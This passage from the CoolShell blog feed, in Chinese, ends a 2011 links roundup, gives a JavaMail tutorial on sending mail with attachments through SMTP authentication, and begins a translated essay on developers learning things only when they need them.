<li>说到Web编程，现在的Web编程和以前很不一样了。你觉得未来的Web编程的技术会是什么样的？NoSQL? 服务器端的Javascript? 各种像Amazon的EC2或S3的云计算平台？更新更强大的开发框架？HTML 5/CSS 3？这里有一篇文章你可以去看看 – “<a href="http://net.tutsplus.com/articles/general/7-exciting-web-development-trends-for-2011/">7 Exciting Web Development Trends for 2011</a>”.</li>
</ul>
<ul>
<li>无论Web编程到了什么时候，安全问题永远都是你需要注意的。这里有一篇文章“<a href="https://code.google.com/intl/zh-CN/edu/submissions/daswani/index.html" target="_blank">What Every Web Programmer Needs To Know About Security</a>” –  每一个Web程序员都应该知道的安全问题。</li>
</ul>
<ul>
<li>再推荐两个关于WebGL的游戏演示，一个是3D的比较好玩的有点<a href="http://cycleblob.com/" target="_blank">像贪吃蛇一样的游戏</a>，另一个是<a href="https://nicolas-bonnel.github.com/WARPG/index.html" target="_blank">RPG式的游戏</a>，第三人称视角，看上去很不错。</li>
</ul>
<ul>
<li>这里有20款图标，<a href="http://www.tutorialcadet.com/20-user-interface-icon-sets-for-developers/" target="_blank">http://www.tutorialcadet.com/20-user-interface-icon-sets-for-developers/</a>，也许会对你的UI开发有帮助。wikipedia上也有一些<a href="https://commons.wikimedia.org/wiki/Comparison_of_icon_sets" target="_blank">免费的图标</a>。</li>
</ul>
<ul>
<li>在以前的“<a title="一些有意思的贴子和工具" href="https://coolshell.cn/articles/3480.html" target="_blank">一些资源介绍</a>”的文章中介绍过<a href="http://mikeos.berlios.de/write-your-own-os.html" target="_blank">一篇教程</a>教你用x86的汇编做一个操作系统， 这里又有一篇文章向你展示了一个最最简单的操作系统内核，这个操作系统叫做<a href="http://www.retroprogramming.com/2011/03/itsy-os-simple-preemptive-switcher.html" target="_blank">Itsy-OS Kernel</a>，你可以看看。</li>
</ul>
<ul>
<li>你还记得Google在四月一日愚人节那天搞的那个<a href="https://mail.google.com/mail/help/motion.html" target="_blank">Google Gmail Motion</a>吗？用你的body Language写邮件？呵呵，不过，某人使用微软的Kinect做到了，视频在这里：<a href="https://www.youtube.com/watch?v=Lfso7_i9Ko8" target="_blank">http://www.youtube.com/watch?v=Lfso7_i9Ko8</a>。项目主页在这里：<a href="http://projects.ict.usc.edu/mxr/faast/">http://projects.ict.usc.edu/mxr/faast/</a>。</li>
<li>不知道你看过电影《创战纪》了吗？我个人觉得电影很一般。不过你想知道里面的一些特效是用什么样的技术怎么做的吗？呵呵，其中的一个程序员写了一篇博文 – “<a href="http://jtnimoy.net/workviewer.php?q=178" target="_blank">Tron Legacy</a>”，我看到了Unix, C++等。这篇文章很不错。</li>
</ul>
<p>好的，就这么多，也欢迎你分享你所看到的和听到的东西。</p>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a>
</li>
<li>
<a href="https://coolshell.cn/articles/6010.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/6010.html" class="wp_rp_title">一些有意思的算法代码</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20845.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_title">Rust语言的编程范式</a>
</li>
<li>
<a href="https://coolshell.cn/articles/10169.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/10169.html" class="wp_rp_title">类型的本质和函数式实现</a>
</li>
<li>
<a href="https://coolshell.cn/articles/9886.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/9886.html" class="wp_rp_title">二叉树迭代器算法</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4220" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="005ad884f4">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>16</strong> 人打了分，平均分： <strong>3.75</strong> )<br><span class="post-ratings-text" id="ratings_4220_text"></span><meta itemprop="name" content="一些有意思的文章和资源">
<meta itemprop="headline" content="一些有意思的文章和资源">
<meta itemprop="description" content="又到了向大家介绍一些最近我在网上发现的有价值的东西的时候了。（下面的链接中很多都被墙）

	以前向大家介绍过《一些重要的算法》和《算法和数据结构词典》，不过，你知道有些什么样比较奇怪的数据结构吗？wikipedia上的这个词条可以让你看看各种不同的数据结构。比如：Skip lists， Bloom filters，或是什么Dancing links。你也许会像一个以“如何学好C++”中的朋友们...">
<meta itemprop="datePublished" content="2011-04-06T08:47:40+08:00">
<meta itemprop="dateModified" content="2011-04-06T21:23:07+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4220.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4220.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.75">
<meta itemprop="ratingCount" content="16">
</div>
</div>
<div id="post-ratings-4220-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-04-06T08:47:40+08:00</pubDate>
<guid>https://coolshell.cn/articles/4220.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ JavaMail使用 ]]></title>
<link>https://coolshell.cn/articles/4261.html</link>
<content><![CDATA[ 
<p>（<strong>本文由网友jjzhx_1211投递，感谢!</strong>）</p>
<p>使用JavaMail需要两个包：activation-1.1.jar和mail-1.4.2.jar（当然现在最新的版本已经不止了），也可以直接包含Java SE 6的j2ee.jar，自带了前面的两个包。我把邮件功能写成了一个服务，发送邮件的数据都通过Map&lt;String, String&gt;类型的参数封装了起来。<strong>代码见文章最后</strong>。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#Session" title="Session">Session</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#Message" title="Message">Message</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#Address" title="Address">Address</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#Authenticator" title="Authenticator">Authenticator</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#Transport" title="Transport">Transport</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#Store_and_Folder" title="Store and Folder">Store and Folder</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E4%BB%A3%E7%A0%81" title="代码">代码</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="Session"></span>Session<span class="ez-toc-section-end"></span>
</h4>
<p>Session 定义了一个基本的邮件会话，任何工作都是基于这个Session的。Session 对象需要一个 java.util.Properties 对象来得到类似 邮件服务器，用户名，密码这样的信息。Session 的构造函数是私有的，可以通过 getDefaultInstance() 方法来取得一个单一的可以被共享的默认session 如：</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">Properties props = new Properties();
Session session = Session.getDefaultInstance(props,null);</pre>
<p>或者，可以使用 getInstance() 方法来创建一个唯一的 session如：</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">Properties props = new Properties();
Session session = Session.getInstance(props,null);</pre>
<p>在这两种方法中 其中的 null 参数是一个 Authenticator 对象，在这里没有被使用的，所以就是null。在大多数案例中，使用一个共享session 已经做够了。</p>
<p><span id="more-4261"></span></p>
<h4>
<span class="ez-toc-section" id="Message"></span>Message<span class="ez-toc-section-end"></span>
</h4>
<p>一旦你创建了Session对象，那么下面要做的就是创建message来发送。Message是一个抽象类，在大部分应用中你可以使用它的子类javax.mail.internet.MimeMessage 。MimeMessage 是一个理解在不同RFCs中定义的MIME类型以及headers的e-mail message。Message headers 必须使用 US-ASCII 字符集。可以用如下的方法创建一个Message</p>
<p><code data-enlighter-language="java" class="EnlighterJSRAW">MimeMessage message = new MimeMessage(session);</code></p>
<p>我们注意到，这里需要用session对象作为构造函数的参数。当然，还有其它的构造函数，比如从用RFC822格式化过的输入流来创建message。</p>
<p>一旦你得到了 message ,你就可以来设置它的各个部分（parts）。设置内容（content）的基本的机制是使用setContent() 方法。</p>
<p><code data-enlighter-language="java" class="EnlighterJSRAW">message.setContent("Email Content. ","text/plain");</code></p>
<p>如果，你能够明确你的使用MimeMessage来创建message 并且只是使用普通的文本（plain text） 那么你也可以使用 setText() 方法，setTest()方法只需要设置具体的内容，它默认的MIME类型是 text/plain</p>
<p><code data-enlighter-language="java" class="EnlighterJSRAW">message.setText("Email Content. ");</code></p>
<p>对于普通文本类型的邮件，有一种机制是首选（ message.setText(“Email Content. “)）的设置内容的方法。如果要创建其它类型的message ，比如　HTML类型的message   那么还是需要使用前者　（　message.setContent(“Email Content. “,”text/html”);　）<br>
设置主题（subject ），使用setSubject() 方法</p>
<p><code data-enlighter-language="java" class="EnlighterJSRAW">message.setSubject(" Subject ");</code></p>
<h4>
<span class="ez-toc-section" id="Address"></span>Address<span class="ez-toc-section-end"></span>
</h4>
<p>当你已经创建Session 以及 Message，并且已经为message 填充了内容，那么接下来要做的就是给你的邮件添加一个地址（Address）。　就像Message一样，Address也是一个抽象类，我们可以使用它的一个子</p>
<p>javax.mail.internet.InternetAddress</p>
<p>创建一个地址非常简单</p>
<p><code data-enlighter-language="java" class="EnlighterJSRAW">Address address = new InternetAddress("&lt;a href="mailto:<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="9cefe9f5e4f5f2dcfdeff5fdf5f2faf3b2fff3f1">[email protected]</a>"&gt;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="2754524e5f4e496746544e464e4941480944484a">[email protected]</a>&lt;/a&gt;");</code></p>
<p>如果，你希望在出现邮件地址的地方出现一个名称，那么你只需要再多传递一个参数。</p>
<p><code data-enlighter-language="java" class="EnlighterJSRAW">Address address = new InternetAddress("&lt;a href="mailto:<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="88fbfde1f0e1e6c8e9fbe1e9e1e6eee7a6ebe7e5">[email protected]</a>&amp;quot;,&amp;quot;Steve"&gt;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="1665637f6e7f785677657f777f7870793875797b">[email protected]</a>","Steve&lt;/a&gt;");</code></p>
<p>你需要为 message 的from以及 to 字段创建address对象。为了识别发送者，你需要使用setFrom() 和 setReplyTo() 方法。</p>
<p><code data-enlighter-language="java" class="EnlighterJSRAW">messge.setFrom(address);</code></p>
<p>如果你的message 需要显示多个 from 地址，可以使用 addFrom() 方法</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">Address address[] = {....};
message.addFrom(address);</pre>
<p>为了辨识message 的收件人，你需要使用 setRecipient() 方法。这个方法除了address参数之外，还需要一</p>
<p>Message.RecipientType 。<br>
message.addRecipient(type,address);<br>
Message.RecipientType有几个预先定义好的类型<br>
Message.RecipientType.TO　　收件人<br>
Message.RecipientType.CC　　抄送<br>
Message.RecipientType.BCC　 暗送</p>
<p>如果你的一封邮件，需要发送给你的老师，并还要给你的几个同学，那么你可以这样</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">Address toAddress = new InternetAddress("&lt;a href="mailto:<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="681c0d090b000d1a28595f5a5050460b0705">[email protected]</a>"&gt;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="8efaebefede6ebfccebfb9bcb6b6a0ede1e3">[email protected]</a>&lt;/a&gt;");
Address[] ccAddress = {new InternetAddress("&lt;a href="mailto:<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e695858e89898a8b879283d7a6d7d1d4dedec885898b">[email protected]</a>&amp;quot;),new"&gt;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="94e7f7fcfbfbf8f9f5e0f1a5d4a5a3a6acacbaf7fbf9">[email protected]</a>"),new&lt;/a&gt; InternetAddress("&lt;a href="mailto:<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="196a7a7176767574786d7c2b59282e2b2121377a7674">[email protected]</a>"&gt;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="4734242f28282b2a26332275077670757f7f6924282a">[email protected]</a>&lt;/a&gt;")};
message.addRecipient(Message.RecipientType.To, toAddress);
message.addRecipient(Message.RecipientType.CC, ccAddress);</pre>
<p>JavaMail 没有提供电子邮件地址有效性的检测。这些超越了JavaMail API的范围。</p>
<h4>
<span class="ez-toc-section" id="Authenticator"></span>Authenticator<span class="ez-toc-section-end"></span>
</h4>
<p>通过Authenticator设置用户名、密码，来访问受保护的资源，这里的资源一般指的是邮件服务器。</p>
<p>Authenticator也是一个抽象类，你需要自己编写子类已备应用。你需要实现getPasswordAuthentication()方法，并返回一个PasswordAuthentication实例。你必须在 session被创建时， 注册你的 Authenticator。这样，当需要进行认证是，你的Authenticator就可以被得到。</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">Properties props = new Properties();
//设置属性
Authenticator auth = new YourAuthenticator();
Session session = Session.getDefaultInstance(props, auth);</pre>
<h4>
<span class="ez-toc-section" id="Transport"></span>Transport<span class="ez-toc-section-end"></span>
</h4>
<p>发送消息最后的一步就是使用Transport类，你可以通过两种方法来进行发送。<br>
Transport 是一个抽象类，你可以调用它静态的send() 方法来发送</p>
<p><code data-enlighter-language="java" class="EnlighterJSRAW">Transport.send(message);</code></p>
<p>或者，你可以为你使用的协议从session中取得一个指定的实例，</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">Transport transport = session.getTransport("smtp");
transport.sendMessage(message, message.getAllRecipients());
transport.close();</pre>
<h4>
<span class="ez-toc-section" id="Store_and_Folder"></span>Store and Folder<span class="ez-toc-section-end"></span>
</h4>
<p>这两个类重要用于取得信息。在创建了Session之后，需要连接到一个 Store ，你需要告诉Store你使用的是什么协议。</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">// Store store = session.getStore("imap");
Store store = session.getStore("pop3");
store.connect(host, username, password);</pre>
<p>在连接到一个 Store 后，你可以得到一个 Folder，当然，这个Floder必须是打开的。</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">Folder folder = store.getFolder("INBOX");
folder.open(Folder.READ_ONLY);
Message message[] = folder.getMessages();</pre>
<p>如果使用POP3那么，INDEX是唯一可用的文件夹。如果使用的是IMAP，你就可以使用其它的文件夹。</p>
<h4>
<span class="ez-toc-section" id="%E4%BB%A3%E7%A0%81"></span>代码<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public boolean sendEmail(Map&lt;String, String&gt; data) {
    // 创建Properties 对象
    Properties props = System.getProperties();
    props.put("mail.smtp.host", Constants.HOST); // 全局变量
    props.put("mail.smtp.auth", "true");

    // 创建邮件会话
    Session session = Session.getDefaultInstance(props,
    new Authenticator() { // 验账账户
        @Override
        public PasswordAuthentication getPasswordAuthentication() {
            return new PasswordAuthentication(Constants.USERNAME,
                                              Constants.PASSWORD);
        }
    });

    try {
        // 定义邮件信息
        MimeMessage message = new MimeMessage(session);
        message.setFrom(new InternetAddress(Constants.FROM));
        message.addRecipient(
            Message.RecipientType.TO,
            new InternetAddress(
                // 这里可以添加多个目的用户
                data.get(Constants.EMAIL_TO)
            )
        );
        // 添加邮件发送时间（不知道体现在哪儿）
        message.setSentDate(new Date());
        // 要编码，否则中文会出乱码，貌似这个方法是对数据进行了
        //("=?GB2312?B?"+enc.encode(subject.getBytes())+"?=")形势的包装
        message.setSubject(MimeUtility.encodeText(data.get(Constants.EMAIL_SUBJECT), "gbk", "B"));

        MimeMultipart mmp = new MimeMultipart();
        MimeBodyPart mbp_text = new MimeBodyPart();
        // "text/plain"是文本型，没有样式，
        //"text/html"是html样式，可以解析html标签
        mbp_text.setContent(data.get(Constants.EMAIL_TEXT),
                            "text/html;charset=gbk");
        mmp.addBodyPart(mbp_text); // 加入邮件正文

        // 处理附件，可以添加多个附件
        if (data.get(Constants.EMAIL_ATTACHMENT) != null) {
            String[] files = data.get(Constants.EMAIL_ATTACHMENT).split(",");
            if (files.length != 0) {
                for (String file : files) {
                    MimeBodyPart mbp_file = new MimeBodyPart();
                    FileDataSource fds = new FileDataSource(file);
                    mbp_file.setDataHandler(new DataHandler(fds));
                    mbp_file.setFileName(MimeUtility.encodeText(fds.getName(), "gbk", "B"));
                    mmp.addBodyPart(mbp_file);
                }
            }
        }
        message.setContent(mmp);
        // message.setText(data.get(Constants.EMAIL_TEXT));

        // 发送消息
        // session.getTransport("smtp").send(message); //也可以这样创建Transport对象
        Transport.send(message);
        return true;
    } catch (Exception e) {
        e.printStackTrace();
        return false;
    }
}
</pre>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/20845.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_title">Rust语言的编程范式</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/11541.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/11541.html" class="wp_rp_title">面向GC的Java编程</a>
</li>
<li>
<a href="https://coolshell.cn/articles/11454.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/11454.html" class="wp_rp_title">从LongAdder看更高效的无锁实现</a>
</li>
<li>
<a href="https://coolshell.cn/articles/11175.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/11175.html" class="wp_rp_title">Java中的CopyOnWrite容器</a>
</li>
<li>
<a href="https://coolshell.cn/articles/9703.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/9703.html" class="wp_rp_title">无锁HashMap的原理与实现</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4261" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="168e007abf">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>8</strong> 人打了分，平均分： <strong>2.75</strong> )<br><span class="post-ratings-text" id="ratings_4261_text"></span><meta itemprop="name" content="JavaMail使用">
<meta itemprop="headline" content="JavaMail使用">
<meta itemprop="description" content="（本文由网友jjzhx_1211投递，感谢!）

使用JavaMail需要两个包：activation-1.1.jar和mail-1.4.2.jar（当然现在最新的版本已经不止了），也可以直接包含Java SE 6的j2ee.jar，自带了前面的两个包。我把邮件功能写成了一个服务，发送邮件的数据都通过Map&lt;String, String&gt;类型的参数封装了起来。代码见文章最后。
Session...">
<meta itemprop="datePublished" content="2011-04-06T23:05:39+08:00">
<meta itemprop="dateModified" content="2011-04-10T21:57:38+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4261.html">
<meta itemprop="author" content="jjzhx_1211">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4261.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="2.75">
<meta itemprop="ratingCount" content="8">
</div>
</div>
<div id="post-ratings-4261-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-04-06T23:05:39+08:00</pubDate>
<guid>https://coolshell.cn/articles/4261.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 程序员的谎谬之言还是至理名言？ ]]></title>
<link>https://coolshell.cn/articles/4235.html</link>
<content><![CDATA[ 
<p>有朋友（网友never）在酷壳Coolshell.cn的<a href="https://coolshell.cn/guestbook#comment-40758" target="_blank">留言版上问我</a>，为什么关注了这很多的东西，我想我可以用下文来回答这位网友，因为我和作者的观点几乎一致。这篇文章由 ALAN SKORKIN写的 “<a href="http://www.skorks.com/2011/02/the-greatest-developer-fallacy-or-the-wisest-words-youll-ever-hear/" target="_blank">The Greatest Developer Fallacy Or The Wisest Words You’ll Ever Hear?</a>” ，我把其全文翻译如下，我很喜欢这篇文章，希望你也喜欢。（翻译的也许不好，欢迎指正）</p>
<p>—————————————————正文分隔线——————————————————</p>
<p><img alt="image placeholder" ></p>
<p>“<span style="color: #cc0000;"><strong><em>I will learn it when I need it – </em>我会在我需要的时候再学</strong></span>“！我听到这句已经很多年了。这对于一个高速变化的软件行业环境来说，这似乎是一个非常实用的态度。 在某些方面这的确很实用主义，不过在其它的方面，我为这句话感到很不爽。这句话变成了整个软件行业的福音，但却没有让我们的软件行业变得更好。其问题在于，<strong>这句话伪装在于其听上去像是一个智慧的有经验的开发者说的，但是人们只是以此为借口而随波逐流</strong>。实在是有太多的东西需要我们去了解，我们也的确需要在工作当中来学习这些东西。但是， “在工作中学习”和“根据遇到的问题捡知识”这两者有着巨大的不同。</p>
<ul>
<li>另外，目前整个软件行业越来越需要一堆多面手，也许现在已经是这样了，只是我还没有注意到。当然，我也不喜欢这种情。现在，好像没有人愿意花更多的时间来把某一个东西学好学深学扎实，比如 <a href="http://www.skorks.com/2010/04/on-the-value-of-fundamentals-in-software-development/" target="_blank">计算机科学的基础知识</a>，或是最新的你正在使用的技术，甚至你在最近几年内每天都在使用其编码的程序语言（参考：<a href="http://blog.tmorris.net/java-is-pass-by-value/" target="_blank">Java is passed by value</a>）（<strong>译注：</strong>我在<a title="如何学好C++语言" href="https://coolshell.cn/articles/4119.html" target="_blank">如何学好C++一文</a>的回复中已经看到一些这样的人）。何苦呢？你会在你的学习路途中看到这些东西被更新，被废弃，并可能变得小众化。我和很多不同的人讨论过很多次，但是好像没有人意识到这是一个问题。 “<strong>哥们，做个实用主义的人吧</strong>”。</li>
</ul>
<ul>
<li>与此同时，我们所有的人都在相互地克隆和模仿（<strong>译注：</strong>参看<a title="中国的C2C模式" href="https://coolshell.cn/articles/3820.html" target="_blank">中国的C2C</a>）。你需要一个Java程序员，我是一个Java程序员，你也是一个Java程序员，我的邻居也是一个Java程序员。我们之间有什么差别？其实，基本没有差别。好吧，我有一些jQuery的经历，太好，所以，你知道怎么来做一个折叠式的菜单？当然，我可以Google一下，然后剽窃别人最好的代码给你 :)（<strong>译注：</strong>参看“<a title="十条不错的编程观点" href="https://coolshell.cn/articles/2424.html" target="_blank">十条不错的编程观点</a>”中的”Googling it” is okay）。</li>
</ul>
<p><span id="more-4235"></span></p>
<ul>
<li>与此同时，你需要招聘到真正的专业级的人物（比如，你需要写一个很牛的解析程序来以图形化展示一下后台数据），那么你可能需要准备足够的啤酒和三明治，因为你可很有一段时间找不到这样的人。</li>
</ul>
<p>好了，其实，是有一些方法来区分，比如，我有更好的沟通能力，这就是为什么我可以做得更好。这是相当重要的，但是，<strong>如果我们用软能力而不是用技术能力来区分程序员的好坏 –  是不是有那么点反常和变态</strong>。我们所有人都可以沟通得很好，但是我们的代码乱成一团 :)。该死的，我本不应该说这事，我也有一点全才的样子。当然，我觉得我自己是一个 <a href="http://darrennegraeff.com/the-importance-of-t-shaped-individuals/" target="_blank">T型人才</a>（<strong>译注</strong>：即有深度又有广度），但是如果我们都非常诚实的话，我们会发现更多的人的能力是“横线型”或是“下划线型”的（<strong>译注</strong>：广度型），其中只有很少数的人才是有能力的。而我们的“T型人才”在这些人中就像一个巨大的钟乳石。<strong>你看上去像一个专家，但也许你从没有做过专家</strong>，这就是专才在满是全才的世界中的优势。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E6%8A%95%E8%B5%84%E4%BD%A0%E7%9A%84%E6%9C%AA%E6%9D%A5" title="投资你的未来">投资你的未来</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84" title="你不知道你不知道的">你不知道你不知道的</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E4%BD%A0%E5%AD%A6%E5%BE%97%E8%B6%B3%E5%A4%9F%E5%BF%AB%E5%90%97%EF%BC%9F" title="你学得足够快吗？">你学得足够快吗？</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%88%91%E5%BA%94%E8%AF%A5%E5%85%B3%E5%BF%83" title="为什么我应该关心">为什么我应该关心</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E6%8A%95%E8%B5%84%E4%BD%A0%E7%9A%84%E6%9C%AA%E6%9D%A5"></span>投资你的未来<span class="ez-toc-section-end"></span>
</h4>
<p>我不想以说教的方式来告诉你人们应该怎么样来投资自己未来的职业生涯，因为每个人都知道我们应该怎么做。很多人也许认为他们正在投资，他们努力奋斗，写很多的代码，并也做一些阅读，当然，这样坚持下去，也许<a href="http://norvig.com/21-days.html" target="_blank">十年也可以成为一个专家</a>，而成为一个咨深专家可能需要20年（我会不断地说这些观点，总有一天我会把这个事说明白 :) ）。但是，如果真是这样的吧，每一个老家伙都会成为各个方面的专家，当然，事实是不会这样的。也许是因为人们不知道如何发展他们的专长（这是事实），但我私下里却怀疑，<strong>大家缺少的是热情而不是知识</strong>。我所说的这些东西难道不都是这样的原因吗？</p>
<p>我完全跑题了。“在专业上投资未来”只是这些流行语中的一个，而重点是那句话 – “<strong><em>I will learn it when I need it – </em>我会在我需要的时候再学</strong>”。对我老爸来说这样做挺好，迄今为止对我也有效。但是让我们换一个角度看看，比如金融方面，如果我们说：“<strong>我会在我需要钱的时候再去进行投资</strong>”。在这句话上面那个实用主义的光环就不那么漂亮了。</p>
<h4>
<span class="ez-toc-section" id="%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84"></span>你不知道你不知道的<span class="ez-toc-section-end"></span>
</h4>
